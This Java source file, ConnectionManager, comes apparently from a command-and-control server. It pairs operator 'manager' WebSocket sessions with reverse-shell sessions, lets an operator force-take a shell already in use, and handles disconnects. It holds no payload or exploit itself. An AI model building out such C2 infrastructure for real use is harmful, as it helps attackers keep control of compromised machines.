package com.mtattab.c2cServer.util;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import lombok.experimental.UtilityClass;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.ArrayList;
import java.util.HashMap;

@UtilityClass
@Slf4j
public class ConnectionManager {
    public static HashMap<WebSocketSession, WebSocketSession > connectedManagerToReverseSessions= new HashMap<>();

    public static HashMap<WebSocketSession, WebSocketSession > connectedReverseToManagerSessions= new HashMap<>();

    public static void disconnectConnection(WebSocketSession session){
        log.info("[+] Disconnecting session {} if it has any active connections to other sockets ",session);
        removeByValue(connectedReverseToManagerSessions, session);
        removeByValue(connectedManagerToReverseSessions, session);
    }



    private static <T> void removeByValue(HashMap<T, T> hashMap, T value ){
//        the below will remove the item from the list based on its value
        hashMap.remove(value);
        ArrayList<T> keysToRemove = new ArrayList<>();

        // First, identify keys to remove
        hashMap.keySet().parallelStream().forEach(key -> {
            if (hashMap.get(key) != null && hashMap.get(key).equals(value)) {
                keysToRemove.add(key);
                log.info("found an active connection with socket {}",hashMap.get(key));
            }
        });

        // Then, remove the identified keys
        keysToRemove.forEach(hashMap::remove);

    }

    public static boolean connectTwoSockets(WebSocketSession managerSocket, WebSocketSession socketToConnectTo, boolean forceConnect){
//        if manger socket is already connected to something ask user to disconnect first
        if (connectedManagerToReverseSessions.get(managerSocket) != null ){

            SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("current socket '%s' is already connected to: '%s' please disconnect first then try again",managerSocket.getId(), connectedManagerToReverseSessions.get(managerSocket)))
                    .build()
            )));
            return false;
        }

//        if target socket is already connected then deny user access to the socket
        if (connectedReverseToManagerSessions.get(socketToConnectTo) != null && !forceConnect){
            SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("target socket '%s' is already connected to: '%s' you can force the connection with the use '-f' flag",socketToConnectTo,
                            connectedReverseToManagerSessions.get(socketToConnectTo)))
                    .build()
            )));
            return false;
//            if the user want to force connect then disconnect already connected reverse shell and create new connection
        } else if (connectedReverseToManagerSessions.get(socketToConnectTo) != null && forceConnect) {
//            inform the manager how is already connected of his removal
            SocketUtil.sendMessage(connectedReverseToManagerSessions.get(socketToConnectTo),
                    new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("you are being disconnected by manager '%s'",managerSocket))
                    .build()
                    )));
            disconnectConnection(socketToConnectTo);
            connect(managerSocket,socketToConnectTo);
            SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("forcing connection to target socket '%s'",socketToConnectTo))
                    .build()
            )));

            return true;
        }

        SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                .msg(String.format("Connected successfuly to socket: '%s'",socketToConnectTo.getId()))
                .build()
        )));

//        establish connection
        connect(managerSocket,socketToConnectTo);


        return true;
    }

    private static void connect(WebSocketSession mangerSocket, WebSocketSession socketToConnectTo){
        connectedManagerToReverseSessions.put(mangerSocket,socketToConnectTo);
        connectedReverseToManagerSessions.put(socketToConnectTo, mangerSocket);
    }

}
